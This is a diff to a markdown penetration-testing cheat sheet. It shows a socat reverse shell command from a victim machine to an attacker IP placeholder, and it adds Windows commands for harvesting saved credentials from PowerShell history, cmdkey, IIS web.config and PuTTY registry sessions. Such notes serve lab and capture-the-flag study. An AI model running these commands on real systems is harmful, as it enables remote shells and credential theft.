@@ -52,13 +52,31 @@ More stable shell
 On the attacker machine, run the command ```socat TCP-L:<PORT> FILE:`tty`,raw,echo=0```  
 On the victim machine run the command ```socat TCP:<attacker-ip>:<attacker-port> exec:"bash -li",pty,stderr,sigint,setsid,sane```
 
-## Priv Esc
+# Priv Esc
 
 [linPEAS/winPEAS](https://github.com/carlospolop/PEASS-ng)  
 Scripts that look for vulnerabilities inside the OS.
 
 [GTFObins](https://gtfobins.github.io/)  
 Curated list of Unix binaries that can be used to bypass local security restrictions in a miconfigured system.
+
+## Windows typical spots for saved credentials
+
+### Powershell history (from cmd)
+```type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt```
+
+### Saved Windows Credentials 
+List the saved windows credentials 
+```cmdkey /list```
+
+Run a program with the saved credentials 
+```runas /savecred /user:<user> cmd.exe```
+
+### IIS Configs 
+```type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionStrin```
+
+### Putty's Proxy sessions 
+```req query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s```
 
 ## Post exploit
 
